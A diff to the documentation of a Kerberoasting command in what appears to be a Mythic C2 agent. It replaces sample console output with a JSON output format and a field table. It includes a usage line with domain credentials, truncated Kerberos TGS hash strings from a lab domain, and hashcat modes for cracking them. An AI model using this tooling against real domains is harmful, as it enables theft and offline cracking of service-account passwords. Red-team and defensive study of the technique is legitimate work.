@@ -43,20 +43,27 @@ With explicit realm:
 kerberoast -server 192.168.1.1 -realm DOMAIN.LOCAL -username user@domain.local -password pass
 ```
 
-## Example Output
+## Output Format
 
+Returns a JSON array of roast result objects rendered as a sortable table via browser script:
+
+```json
+[
+  {"account": "sql_svc", "spn": "MSSQLSvc/braavos.essos.local", "etype": "RC4-HMAC", "hash": "$krb5tgs$23$*sql_svc$ESSOS.LOCAL$...", "status": "roasted"},
+  {"account": "http_svc", "spn": "HTTP/web.essos.local", "etype": "AES256-CTS", "hash": "", "status": "failed", "error": "connection refused"}
+]
 ```
-[*] Kerberoasting 2 SPN(s) from ESSOS.LOCAL (KDC: 192.168.100.53)
-------------------------------------------------------------
 
-[+] sql_svc — MSSQLSvc/braavos.essos.local (RC4-HMAC)
-$krb5tgs$23$*sql_svc$ESSOS.LOCAL$MSSQLSvc/braavos.essos.local*$5f072ca978...
+| Field | Description |
+|-------|-------------|
+| account | Target account name |
+| spn | Service Principal Name |
+| etype | Encryption type (RC4-HMAC, AES128-CTS, AES256-CTS) |
+| hash | Extracted hash in hashcat-compatible format |
+| status | `roasted` (hash extracted) or `failed` |
+| error | Error message when status is `failed` |
 
-[+] sql_svc — MSSQLSvc/braavos.essos.local:1433 (RC4-HMAC)
-$krb5tgs$23$*sql_svc$ESSOS.LOCAL$MSSQLSvc/braavos.essos.local:1433*$6f29d68a...
-
-[*] 2/2 hashes extracted (hashcat -m 13100 for RC4, -m 19600 for AES128, -m 19700 for AES256)
-```
+Successfully roasted hashes are highlighted green in the browser script table. Hashes are also reported to the Mythic credential vault.
 
 ## Cracking Hashes
 
